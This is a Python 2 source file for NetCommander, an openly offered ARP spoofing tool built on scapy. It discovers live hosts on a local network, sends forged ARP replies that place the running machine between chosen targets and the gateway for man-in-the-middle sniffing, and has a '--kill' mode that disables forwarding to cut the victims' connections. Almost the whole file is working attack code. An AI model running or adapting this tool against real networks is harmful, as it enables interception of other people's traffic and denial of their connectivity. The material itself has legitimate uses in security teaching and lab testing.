#!/usr/bin/python
# coding: utf-8
# This file is part of NetCommander.
#
# Copyright(c) 2010-2011 Simone Margaritelli
# evilsocket@gmail.com
# http://www.evilsocket.net
# http://www.backbox.org
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
"""
这是一个简单的ARPspoofer。首先通过发送ARP请求给可能的IP以发现网络上活跃的计算机，
然后你只需选择一个连接，代码会自动的进行ARP欺骗造成中间人攻击
"""

import logging
import time
import os
import sys
import atexit
import re
from optparse import OptionParser
import warnings

# ignore deprecation warnings from scapy inclusion
warnings.filterwarnings( "ignore", category = DeprecationWarning )
# disable scapy warnings about ipv6 and shit like that
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import srp,Ether,ARP,conf,sendp,ltoa,atol

class NetCmd:

  def __bit_count( self, n ):
    bits = 0
    while n:
      bits += n & 1
      n   >>= 1
    return bits

  def __set_forwarding( self, status ):
    # Mac OS X
    if sys.platform == 'darwin':
      p = os.popen( "sysctl -w net.inet.ip.forwarding=%s" % '1' if status == True else '0' )
      output = p.readline()
      p.close()

      if status and not re.match( r'net\.inet\.ip\.forwarding:\s+\d\s+\->\s+\d', output ):
        raise Exception( "Unexpected output '%s' while turning ip forwarding." % output )
    # Linux
    else:
      if not os.path.exists( '/proc/sys/net/ipv4/ip_forward' ):
        raise Exception( "'/proc/sys/net/ipv4/ip_forward' not found, this is not a compatible operating system." )

      fd = open( '/proc/sys/net/ipv4/ip_forward', 'w+' )
      fd.write( '1' if status == True else '0' )
      fd.close()

  def __preload_mac_table( self ):
    if os.path.exists( 'mac-prefixes' ):
      print "@ Preloading MAC table ..."

      fd = open( 'mac-prefixes' )
      for line in iter(fd):
        ( prefix, vendor ) = line.strip().split( ' ', 1 )
        self.mac_prefixes[prefix] = vendor

      fd.close()

  def __find_mac_vendor( self, mac ):
    mac = mac.replace( ':', '' ).upper()[:6]
    try:
      return self.mac_prefixes[mac]
    except KeyError as e:
      return ''

  def find_alive_hosts( self ):
    self.gateway_hw = None
    self.endpoints  = []

    print "@ Searching for alive network endpoints ..."

    # broadcast arping ftw
    ans,unans = srp( Ether( dst = "ff:ff:ff:ff:ff:ff" ) / ARP( pdst = self.network ),
                     verbose = False,
                     filter  = "arp and arp[7] = 2",
                     timeout = 2,
                     iface_hint = self.network )

    for snd,rcv in ans:
      if rcv.psrc == self.gateway:
        self.gateway_hw = rcv.hwsrc
      else:
        self.endpoints.append( ( rcv.hwsrc, rcv.psrc ) )

    if self.endpoints == [] and not self.all:
      raise Exception( "Could not find any network alive endpoint." )

  def __init__( self, interface, gateway = None, network = None, kill = False, all = False ):
    # scapy, you're pretty cool ... but shut the fuck up bitch!
    conf.verb = 0

    self.interface    = interface
    self.network      = network
    self.targets      = []
    self.gateway      = gateway
    self.all          = all
    self.gateway_hw   = None
    self.packets      = []
    self.restore      = []
    self.endpoints    = []
    self.mac_prefixes = {}

    if not os.geteuid() == 0:
      raise Exception( "Only root can run this script." )

    self.__preload_mac_table()

    print "@ Searching for the network gateway address ..."

    # for route in conf.route.routes:
    for net, msk, gw, iface, addr in conf.route.routes:
      # found a route for given interface
      if iface == self.interface:
        network = ltoa( net )
        # compute network representation if not yet done
        if network.split('.')[0] == addr.split('.')[0]:
          bits = self.__bit_count( msk )
          self.network = "%s/%d" % ( network, bits )
        # search for a valid network gateway
        if self.gateway is None and gw != '0.0.0.0':
          self.gateway = gw

    if self.gateway is not None and self.network is not None:
      print "@ Gateway is %s on network %s ." % ( self.gateway, self.network )
    else:
      raise Exception( "Could not find any network gateway." )

    self.find_alive_hosts()

    print "@ Please choose your target :"
    choice = None

    if all:
      self.targets = self.endpoints
    else:
      while choice is None:
        for i, item in enumerate( self.endpoints ):
          ( mac, ip ) = item
          vendor      = self.__find_mac_vendor( mac )
          print "  [%d] %s %s %s" % ( i, mac, ip, "( %s )" % vendor if vendor else '' )
        choice = raw_input( "@ Choose [0-%d] (* to select all, r to refresh): " % (len(self.endpoints) - 1) )
        try:
          choice = choice.strip()
          if choice == '*':
            self.targets = self.endpoints
          elif choice.lower() == 'r':
            choice = None
            self.find_alive_hosts()
          else:
            self.targets.append( self.endpoints[ int(choice) ] )
        except Exception as e:
          print "@ Invalid choice!"
          choice = None

    self.craft_packets()

    if not kill:
      print "@ Enabling ipv4 forwarding system wide ..."
      self.__set_forwarding( True )
    else:
      print "@ Disabling ipv4 forwarding system wide to kill target connections ..."
      self.__set_forwarding( False )

    atexit.register( self.restore_cache )

  def craft_packets( self ):
    # craft packets to accomplish a full forwarding:
    #   gateway -> us -> target
    #   target  -> us -> gateway
    for target in self.targets:
      self.packets.append( Ether( dst = self.gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = self.gateway ) )
      self.packets.append( Ether( dst = target[0] )       / ARP( op = "who-has", psrc = self.gateway, pdst = target[1] ) )
      # and packets to restore the cache later
      self.restore.append( Ether( src = target[0],       dst = self.gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = self.gateway ) )
      self.restore.append( Ether( src = self.gateway_hw, dst = target[0] )       / ARP( op = "who-has", psrc = self.gateway, pdst = target[1] ) )

  def restore_cache( self ):
    os.write( 1, "\n@ Restoring ARP cache " )
    for i in range(5):
      for packet in self.restore:
        sendp( packet, iface_hint = self.gateway )
      os.write( 1, '.' )
      time.sleep(1)
    os.write( 1, "\n" )

    self.__set_forwarding( False )

  def spoof( self ):
    if self.all and self.targets != self.endpoints:
      self.targets = self.endpoints
      self.craft_packets()

    for packet in self.packets:
      sendp( packet, iface_hint = self.gateway )

try:
  print "\n\tNetCommander 1.3 - An easy to use arp spoofing tool.\n \
\tCopyleft Simone Margaritelli <evilsocket@gmail.com>\n \
\thttp://www.evilsocket.net\n\thttp://www.backbox.org\n";

  parser = OptionParser( usage = "usage: %prog [options]" )

  parser.add_option( "-I", "--iface",   action="store",      dest="iface",   default=conf.iface, help="Network interface to use if different from the default one." );
  parser.add_option( "-N", "--network", action="store",      dest="network", default=None,       help="Network to work on." );
  parser.add_option( "-G", "--gateway", action="store",      dest="gateway", default=None,       help="Gateway to use." );
  parser.add_option( "-K", "--kill",    action="store_true", dest="kill",    default=False,      help="Kill targets connections instead of forwarding them." )
  parser.add_option( "-D", "--delay",   action="store",      dest="delay",   default=5,          help="Delay in seconds between one arp packet and another, default is 5." )
  parser.add_option( "-A", "--all",     action="store_true", dest="all",     default=False,      help="Keep spoofing and spoof all connected and later connected interfaces." )

  (o, args) = parser.parse_args()

  ncmd = NetCmd( o.iface, o.gateway, o.network, o.kill, o.all )
 
  if not o.kill:
    os.write( 1, "@ Spoofing, launch your preferred network sniffer to see target traffic " )
  else:
    os.write( 1, "@ Killing target connections " )

  slept = 0
  while 1:
    ncmd.spoof()
    os.write( 1, '.' )
    time.sleep( o.delay )
    slept += 1

    if o.all and slept > 10:
      ncmd.restore_cache()
      ncmd.find_alive_hosts()
      slept = 0

except KeyboardInterrupt:
  pass
except Exception as e:
  print "@ ERROR : %s" % e
